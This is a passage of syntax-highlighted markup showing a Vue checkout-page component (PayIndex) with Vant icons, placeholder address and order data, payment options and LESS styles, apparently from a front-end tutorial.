#9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"address"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"left-icon"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"logistics"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info"</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info-content"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"name"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">小红</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"mobile"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">13811112222</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info-address"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">江苏省 无锡市 南长街 110号 504</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info"</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-else</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">请选择配送地址</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"right-icon"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"arrow"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 订单明细 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"goods-item"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"left"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"http://cba.itlike.com/public/uploads/10001/20230321/8f505c6c437fc3d4b4310b57b1567544.jpg"</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span></span><span class="line"><span style="color: #D4D4D4">            /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"right"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"tit text-ellipsis-2"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">              三星手机 SAMSUNG Galaxy S23 8GB+256GB 超视觉夜拍系统 超清夜景</span></span><span class="line"><span style="color: #D4D4D4">              悠雾紫 5G手机 游戏拍照旗舰机s23</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"count"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">x3</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"price"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">¥9.99</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"flow-num-box"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">共 12 件商品，合计：</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"money"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">￥1219.00</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-detail"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-cell"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">订单总金额：</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"red"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">￥1219.00</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-cell"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">优惠券：</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">无优惠券可用</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-cell"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">配送费用：</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">请先选择配送地址</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-else</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"red"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">+￥0.00</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">&lt;!-- 支付方式 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-way"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"tit"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">支付方式</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-cell"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&gt;&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"balance-o"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">余额支付（可用 ¥ 999919.00 元）</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">&lt;!-- &lt;span&gt;请先选择配送地址&lt;/span&gt; --&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"red"</span><span style="color: #808080">&gt;&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"passed"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">&lt;!-- 买家留言 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"buytips"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">textarea</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">placeholder</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"选填：买家留言（50字内）"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">cols</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"30"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">rows</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"10"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">textarea</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 底部提交 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"footer-fixed"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"left"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">实付款：</span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">￥999919</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"tipsbtn"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">提交订单</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"PayIndex"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {};</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods:</span><span style="color: #D4D4D4"> {},</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.pay</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  ::</span><span style="color: #569CD6">v-deep</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.van-nav-bar__arrow</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D7BA7D">.address</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex-start</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#666</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">relative</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">url(@</span><span style="color: #CE9178">/assets/border-line.png</span><span style="color: #DCDCAA">)</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">bottom</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">repeat-x</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">60px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">auto</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.left-icon</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.right-icon</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">absolute</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">50%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">translateY</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">-7px</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D7BA7D">.goods-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">6px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">80px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">auto</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.right</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    